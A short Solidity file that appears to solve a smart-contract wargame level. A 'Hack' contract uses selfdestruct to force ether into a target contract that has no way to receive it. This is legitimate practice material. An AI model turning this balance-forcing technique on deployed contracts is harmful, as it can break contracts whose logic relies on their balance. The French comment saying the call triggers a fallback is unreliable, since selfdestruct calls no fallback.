// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Hack{

    address payable target;

constructor(address payable _target) payable {
    target = _target;
}

function sendEth() public payable {
    // Envoyer une transaction vide pour déclencher le fallback
    selfdestruct(payable(target));
}

function getBalance() public view returns(uint) {
    return address(this).balance;
    }


}